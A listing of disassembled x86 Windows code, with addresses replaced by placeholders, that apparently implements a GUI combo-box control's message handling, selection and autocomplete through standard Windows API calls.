mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
push esi
mov eax [ ebp + 0x8 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
cmp [ ebx ] 0x203
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4452ec
test al al
je r-xdata
sub eax 0x100
je r-xdata
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub eax 0x2
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4453d4
test al al
je r-xdata
sub eax 0xfb
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x80
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_437600
test al al
je r-xdata
sub eax 0x7
je r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_4603b0
jmp r-xdata
sub eax 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffe9
call sub_4034e4
dec eax
je r-xdata
mov [ ebx + 0xc ] 0x4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_456c04
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4366bc
test al al
je r-xdata
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44549c
test al al
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
je r-xdata
sub eax 0x7c
je r-xdata
movsx eax [ ebx + 0x8 ]
mov [ ebp - 0xc ] eax
movsx eax [ ebx + 0xa ]
mov [ ebp - 0x8 ] eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
push esi
call MapWindowPoints
mov ax [ ebp - 0xc ]
mov [ ebx + 0x8 ] ax
mov ax [ ebp - 0x8 ]
mov [ ebx + 0xa ] ax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov di [ ebx + 0x4 ]
cmp di 0xd
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_437600
test al al
je r-xdata
cmp di 0x1b
jne r-xdata
mov [ ebx + 0xc ] 0xffffffff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_437624
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_437bec
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ esi ]
sub eax 0x5
je r-xdata
mov edi [ esi ]
cmp edi 0x201
je r-xdata
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub eax 0xfd
je r-xdata
mov eax ebx
call sub_440420
test al al
jne r-xdata
cmp edi 0x203
jne r-xdata
mov edx esi
mov eax ebx
call sub_443eac
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov edx esi
mov eax ebx
call sub_44549c
test al al
jne r-xdata
add eax 0xffffffd0
sub eax 0x7
jb r-xdata
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
cmp di 0xd
je r-xdata
mov eax [ ebx + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_41ffac
push eax
mov eax [ esi + 0x4 ]
push eax
call SetTextColor
mov eax [ ebx + 0x170 ]
call sub_420c30
call sub_41ffac
push eax
mov eax [ esi + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0x170 ]
call sub_420c6c
mov [ esi + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov edx esi
mov eax ebx
call sub_443e18
test al al
jne r-xdata
mov eax ebx
call sub_437600
test al al
je r-xdata
cmp di 0x1b
jne r-xdata
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
xor edx edx
mov eax ebx
call sub_437624
jmp r-xdata
sub_437cfa
add [ eax ] al
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_437e58
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax [ edx + 0x6 ]
cmp eax 0x8
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437e5f
lea eax [ ebp - 0x4 ]
call sub_404038
retn
jmp [ eax * 4 + jump_table_437d28 ]
mov eax edi
mov si 0xffe9
call sub_4034e4
jmp r-xdata
mov eax edi
mov si 0xffb3
call sub_4034e4
jmp r-xdata
mov [ edi + 0x25d ] 0x0
mov eax edi
mov si 0xffb1
call sub_4034e4
mov eax edi
mov edx [ eax ]
call [ edx + 0xf0 ]
cmp [ edi + 0x25d ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
lea ecx [ ebp - 0x4 ]
mov eax [ edi + 0x23c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_43fce0
mov eax edi
mov si 0xffeb
call sub_4034e4
mov eax edi
mov si 0xffb2
call sub_4034e4
jmp r-xdata
mov eax edi
mov si 0xffb0
call sub_4034e4
jmp r-xdata
mov [ edi + 0x25e ] 0x1
mov [ edi + 0x25d ] 0x1
mov eax edi
call sub_444c1c
jmp r-xdata
mov [ edi + 0x25e ] 0x0
mov [ edi + 0x25d ] 0x1
mov eax edi
call sub_444d08
push 0x0
push 0x0
push 0x1f
mov eax edi
call sub_4464d0
push eax
call PostMessageA
cmp [ edi + 0x25e ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x14f
mov eax edi
call sub_4464d0
push eax
call PostMessageA
jmp r-xdata
sub_437e8c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov esi ecx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_437f35
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x208 ]
call sub_43e8a4
cmp [ ebx + 0x282 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x208 ]
call sub_421010
test esi esi
jl r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov ax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x284 ]
call [ ebx + 0x280 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437f3c
lea eax [ ebp - 0x14 ]
call sub_404038
retn
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebx + 0x23c ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x10 ]
add edx 0x2
mov ecx [ ebp - 0xc ]
mov eax [ ebx + 0x208 ]
call sub_4211fc
sub_437f68
push esi
push edi
mov esi eax
mov eax esi
call sub_441d6c
mov edi [ esi + 0x214 ]
cmp edi 0xffffffff
je r-xdata
pop edi
pop esi
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_437f90
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax esi
call sub_4467d4
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
call GetFocus
cmp eax [ esi + 0x240 ]
je r-xdata
mov bl 0x1
cmp eax [ esi + 0x244 ]
je r-xdata
xor ebx ebx
jmp r-xdata
sub_437fe4
push ebx
push esi
cmp [ eax + 0x222 ] 0x0
je r-xdata
mov si 0xffb3
call sub_4034e4
pop esi
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x224 ]
call [ ebx + 0x220 ]
pop esi
pop ebx
retn
sub_438010
push ebx
mov ebx eax
mov eax ebx
call sub_443450
push 0x0
mov eax [ ebx + 0x20c ]
push eax
push 0x141
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
xor eax eax
mov [ ebx + 0x240 ] eax
xor eax eax
mov [ ebx + 0x244 ] eax
pop ebx
retn
sub_438048
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x104 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
cmp ebx eax
jle r-xdata
cmp ebx 0x1
jge r-xdata
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x25c ] 0x1
xor eax eax
push ebp
push sub_4380de
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x9e
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xfc ]
imul ebx
mov edx [ ebp - 0x4 ]
add eax [ edx + 0x4c ]
add eax 0x2
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
push eax
call SetWindowPos
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4380e5
mov eax [ ebp - 0x4 ]
mov [ eax + 0x25c ] 0x0
retn
mov ebx 0x1
sub_4380e5
push 0x5f
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
push eax
call SetWindowPos
pop ebx
pop ecx
pop ebp
retn
sub_438104
push esi
push edi
mov esi eax
mov edi [ esi + 0x23c ]
test edi edi
je r-xdata
mov [ esi + 0x23c ] edx
pop edi
pop esi
retn
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop edi
pop esi
retn
sub_438134
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4381b3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4381ba
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
lea ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x23c ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax esi
pop edx
mov ebx [ eax ]
call [ ebx + 0xd4 ]
sub_4381c0
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_438200
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4044e8
xor eax eax
push ebp
push sub_438249
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x23c ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438250
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_438258
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_437440
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf8 ]
mov dl 0x1
call sub_4032b8
mov esi eax
mov [ ebx + 0x23c ] esi
mov [ esi + 0x10 ] ebx
mov [ ebx + 0x238 ] 0x10
mov [ ebx + 0x276 ] 0x0
xor eax eax
mov [ ebx + 0x26c ] eax
mov [ ebx + 0x268 ] 0x1
mov [ ebx + 0x290 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_4382dc
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x23c ]
call sub_4032e8
mov eax [ esi + 0x278 ]
call sub_4032e8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_437534
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_43832c
push ebx
mov ebx eax
cmp dl [ ebx + 0x276 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x276 ] dl
cmp dl 0x1
jne r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
call sub_443a38
sub_438390
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_443324
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_443250
mov eax [ esi + 0x4 ]
or eax 0x200240
xor edx edx
mov dl [ ebx + 0x276 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x275 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x274 ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_4383f1
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov ebx eax
mov eax ebx
call sub_438010
mov eax ebx
call sub_4464d0
mov [ ebx + 0x248 ] eax
mov esi [ ebx + 0x278 ]
test esi esi
je r-xdata
mov al [ ebx + 0x276 ]
sub al 0x2
jae r-xdata
mov edx esi
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebx + 0x278 ]
call sub_4032e8
xor eax eax
mov [ ebx + 0x278 ] eax
cmp [ ebx + 0x260 ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x5
mov eax ebx
call sub_4464d0
push eax
call GetWindow
mov esi eax
test esi esi
je r-xdata
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebx + 0x260 ]
jge r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x240 ] 0x0
je r-xdata
cmp [ ebx + 0x276 ] 0x1
jne r-xdata
push 0x0
mov eax [ ebx + 0x260 ]
push eax
push 0x14e
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebx + 0x260 ] eax
push 0x0
push 0x3
push 0xd3
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
mov edi esi
mov [ ebx + 0x240 ] edi
push 0xfffffffc
push edi
call GetWindowLongA
mov [ ebx + 0x250 ] eax
mov eax [ ebx + 0x24c ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x240 ]
push eax
call SetWindowLongA
mov edi esi
mov [ ebx + 0x244 ] edi
push 0xfffffffc
push edi
call GetWindowLongA
mov [ ebx + 0x258 ] eax
mov eax [ ebx + 0x254 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x244 ]
push eax
call SetWindowLongA
push 0x2
push esi
call GetWindow
mov esi eax
sub_438534
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_443834
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebx + 0x260 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov esi eax
mov [ ebx + 0x278 ] esi
mov edx [ ebx + 0x23c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_438584
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x276 ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x170 ]
call sub_420c6c
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov [ esi + 0xc ] 0x1
jmp r-xdata
add esp 0x10
pop esi
pop ebx
retn
sub_4385d8
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push ebx
push 0x140
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4464d0
push eax
call SendMessageA
mov eax [ esi ]
cmp eax [ ebx ]
seta al
pop esi
pop ebx
pop ebp
retn
sub_438604
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4386c0
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43fcb0
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x140
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4464d0
push eax
call SendMessageA
mov ecx [ ebp - 0x8 ]
sub ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
inc edx
lea eax [ ebp - 0xc ]
call sub_404598
push 0x0
push 0xffffffff
push 0x14e
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4464d0
push eax
call SendMessageA
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_43fce0
mov bx [ ebp - 0x4 ]
mov edx ebx
mov eax ebx
call sub_406d20
push eax
push 0x0
push 0x142
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4464d0
push eax
call SendMessageA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4386c7
lea eax [ ebp - 0xc ]
call sub_404038
retn
sub_4386cc
push ebp
mov ebp esp
mov ecx 0xb
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_438a84
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44547c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x268 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438a8b
lea eax [ ebp - 0x58 ]
mov edx 0x5
call sub_40405c
lea eax [ ebp - 0x44 ]
call sub_404038
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_40405c
lea eax [ ebp - 0x38 ]
mov edx 0x2
call sub_40405c
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_40405c
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x276 ]
sub al 0x2
jae r-xdata
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x26c ]
cmp eax 0x1f4
jb r-xdata
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
call sub_43fcb0
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
add eax 0x270
call sub_40408c
jmp r-xdata
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
add eax 0x270
call sub_404038
mov al [ ebx ]
sub al 0x8
je r-xdata
push ebp
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
call sub_4385d8
pop ecx
test al al
je r-xdata
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x276 ]
sub al 0x2
jae r-xdata
push ebp
call sub_438604
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x269 ] 0x0
je r-xdata
sub al 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_4042f8
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_40c1d4
cmp al 0x2
je r-xdata
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_43fcb0
mov eax [ ebp - 0x38 ]
call sub_4042f8
test eax eax
jle r-xdata
mov [ ebx ] 0x0
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_4034e4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_437600
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x269 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_4042f8
mov edx eax
mov eax [ ebp - 0x4 ]
add eax 0x270
mov ecx 0x1
call sub_404598
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_4042f8
mov edx eax
mov eax [ ebp - 0x4 ]
add eax 0x270
mov ecx 0x1
call sub_404598
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_43fcb0
mov esi [ ebp - 0x8 ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_437624
jmp r-xdata
push ebp
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
call sub_4385d8
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_437600
test al al
jne r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
call sub_40c1d4
cmp al 0x2
je r-xdata
lea eax [ ebp - 0x50 ]
mov dl [ ebx ]
call sub_404220
mov ecx [ ebp - 0x50 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x270 ]
lea eax [ ebp - 0x14 ]
call sub_404344
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
mov ecx [ ebp - 0x8 ]
mov edx 0x1
call sub_404558
mov eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x4c ]
mov dl [ ebx ]
call sub_404220
mov ecx [ ebp - 0x4c ]
lea eax [ ebp - 0x14 ]
pop edx
call sub_404344
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_437624
dec esi
lea eax [ ebp - 0x10 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0x14 ]
call sub_404558
push 0x0
push 0xffffffff
push 0x14e
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
call SendMessageA
lea eax [ ebp - 0x40 ]
push eax
mov edx [ ebp - 0xc ]
inc edx
mov ecx 0x7fffffff
mov eax [ ebp - 0x14 ]
call sub_404558
mov ecx [ ebp - 0x40 ]
lea eax [ ebp - 0x3c ]
mov edx [ ebp - 0x10 ]
call sub_404344
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0x4 ]
call sub_43fce0
mov edi esi
dec edi
mov edx edi
mov eax edi
call sub_406d20
push eax
push 0x0
push 0x142
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
call SendMessageA
lea edx [ ebp - 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_43fcb0
mov edx [ ebp - 0x44 ]
mov eax [ ebp - 0x4 ]
add eax 0x270
call sub_40408c
jmp r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_438a94
test al al
je r-xdata
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
lea eax [ ebp - 0x30 ]
push eax
call PeekMessageA
test eax eax
je r-xdata
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov [ ebx ] 0x0
cmp [ ebp - 0x2c ] 0x102
jne r-xdata
lea eax [ ebp - 0x58 ]
mov dl [ ebp - 0x28 ]
call sub_404220
mov ecx [ ebp - 0x58 ]
lea eax [ ebp - 0x54 ]
mov edx [ ebp - 0x14 ]
call sub_404344
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x4 ]
call sub_438a94
test al al
je r-xdata
push 0x1
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
lea eax [ ebp - 0x30 ]
push eax
call PeekMessageA
mov [ ebx ] 0x0
jmp r-xdata
sub_438a94
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_438c49
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4042f8
test eax eax
jne r-xdata
mov eax esi
call sub_4044f8
push eax
push 0xffffffff
push 0x14c
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
or edx 0xffffffff
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax ebx
mov si 0xffb3
call sub_4034e4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438c50
lea eax [ ebp - 0x1c ]
call sub_404038
lea eax [ ebp - 0x18 ]
mov edx 0x3
call sub_40405c
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
cmp eax [ ebp - 0x8 ]
setne [ ebp - 0x9 ]
cmp [ ebx + 0x290 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
push 0x14e
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
mov al [ ebx + 0x276 ]
sub al 0x2
jae r-xdata
mov edx esi
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
inc eax
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
lea eax [ ebx + 0x270 ]
mov edx esi
call sub_40408c
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x23c ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x18 ]
push eax
mov eax esi
call sub_4042f8
mov edx eax
inc edx
mov ecx 0x7fffffff
pop eax
call sub_404558
mov ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
mov edx esi
call sub_404344
mov edx [ ebp - 0x10 ]
mov eax ebx
call sub_43fce0
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_43fcb0
mov eax [ ebp - 0x1c ]
call sub_4042f8
push eax
mov eax esi
call sub_4042f8
pop edx
call sub_406d20
push eax
push 0x0
push 0x142
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
jmp r-xdata
push 0x0
push 0x0
push 0x14f
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
mov eax ebx
mov si 0xffeb
call sub_4034e4
mov eax ebx
mov si 0xffb2
call sub_4034e4
cmp [ ebp - 0x9 ] 0x0
je r-xdata
sub_438c7c
push ebx
push esi
push edi
push ebp
mov esi eax
mov ebx [ edx + 0x8 ]
mov di [ ebx + 0x10 ]
mov ebp [ ebx + 0x10 ]
test ebp 0x1000
je r-xdata
test ebp 0x20
je r-xdata
or di 0x1000
mov edx [ ebx + 0x18 ]
mov eax [ esi + 0x208 ]
call sub_4214ec
mov edx [ esi + 0x68 ]
mov eax [ esi + 0x208 ]
call sub_42138c
mov edx [ esi + 0x170 ]
mov eax [ esi + 0x208 ]
call sub_4213a8
cmp [ ebx + 0x8 ] 0x0
jl r-xdata
or di 0x20
mov ebp [ ebx + 0x8 ]
test ebp ebp
jl r-xdata
test di 0x1
je r-xdata
lea edx [ ebx + 0x1c ]
mov eax [ esi + 0x208 ]
call sub_421010
push edi
lea ecx [ ebx + 0x1c ]
mov edx ebp
mov eax esi
